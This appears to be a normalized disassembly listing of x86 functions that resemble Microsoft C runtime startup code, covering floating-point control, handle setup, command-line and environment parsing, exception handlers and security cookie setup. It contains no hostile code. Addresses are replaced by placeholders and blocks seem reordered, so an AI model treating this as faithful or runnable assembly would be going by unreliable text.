je r-xdata
fld [ ebp - 0x14 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x14 ]
fchs
shr [ ebp - 0x14 ] 0x1
test [ ebp - 0x10 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x10 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x14 ] 0x80000000
mov esi ebx
test [ ebp - 0x14 ] bl
je r-xdata
sub_1001d1a8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
je r-xdata
call sub_10017e85
mov [ eax ] 0x21
jle r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x3
jg r-xdata
call sub_10017e85
mov [ eax ] 0x22
pop ebp
retn
sub_1001d1d5
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_1001d209
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_1001d405
push [ ebp + 0x8 ]
call sub_1001d1a8
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_1001d405
lea eax [ ebp - 0x20 ]
push eax
call sub_10018e36
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_1001d1a8
pop ecx
sub_1001d2a9
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
fld [ ebp + 0xc ]
fadd [ ebp + 0x14 ]
fstp [ ebp - 0x8 ]
jne r-xdata
call sub_10017e85
push 0xffff
push [ ebp + 0x1c ]
mov [ eax ] 0x21
call sub_1001d405
fld [ ebp - 0x8 ]
pop ecx
pop ecx
leave
retn
push [ ebp + 0x1c ]
fld [ ebp - 0x8 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebp + 0x14 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_1001d209
add esp 0x24
leave
retn
sub_1001d30a
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x28 ]
lea eax [ ebx + 0x20 ]
push eax
push [ ebx + 0x8 ]
call sub_1001cfc4
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_1001d1d5
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
fld [ ebx + 0x18 ]
and eax 0xffffffe3
fstp [ ebp - 0x50 ]
or eax 0x3
mov [ ebp - 0x40 ] eax
push 0x0
lea eax [ ebx + 0x20 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x28 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_1001cce8
add esp 0x1c
push eax
call sub_1001d1a8
mov [ esp ] 0xffff
push [ ebx + 0x28 ]
call sub_1001d405
fld [ ebx + 0x20 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x28 ]
fld [ ebx + 0x20 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebx + 0x18 ]
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_1001d209
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_1001d405
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and ax [ ebp - 0x4 ]
or ax cx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1001d430
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_1001d488
push 0x8
push r--data
call sub_1001de70
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_1001deb5
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_1001d4fa
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1001d54f
mov edi edi
push esi
call sub_1001bf04
mov esi eax
push esi
call sub_1001b6a8
push esi
call sub_1001b75a
push esi
call sub_1001e537
push esi
call sub_1002494c
push esi
call sub_10022ac7
push esi
call sub_1001e7d8
add esp 0x18
pop esi
retn
sub_1001d582
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_1001d5a6
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_10022983
push r--data
push r--data
call sub_1001d582
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_100249f0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_1001de46
call sub_10018d37
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_100249f0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1001d63d
push 0x20
push r--data
call sub_1001de70
push 0x8
call sub_1001fd54
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001d768
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_1001deb5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_1001fc7b
pop ecx
push [ ebp + 0x8 ]
call sub_1001d525
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_1001bf04
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_1001bf04
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_1001d7c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_10019e40
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_10019e40
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_1001da05
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_1001750d
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_1001da58
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1001caac
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_10019e40
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10018330
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10018330
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_1001750d
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_10019e40
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_1001750d
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1001b438
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001b892
int3
add edi 0x4
sub_1001db34
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_10024aff
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_10024aff
pop ecx
test eax eax
je r-xdata
call sub_10024aff
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_1001dcce
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1001caac
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_1001db34
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_10019dfb
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_1001db34
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1001dd89
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_10019dfb
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_1001750d
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_1001de20
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1001de46
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1001de70
push sub_1001ded0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1001ded0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10016ec3
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10016ec3
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_10022e1b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_10022dd2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10016ec3
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10016ec3
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_10022e02
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_10022e1b
mov eax [ ebp + 0xc ]
push r--data
call sub_100249f0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10016ec3
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_10022de9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10016ec3
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_1001e05f
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1001c03b
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_1001e1a9
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1001e05f
pop ecx
pop ecx
pop ebp
retn
sub_1001e1c9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
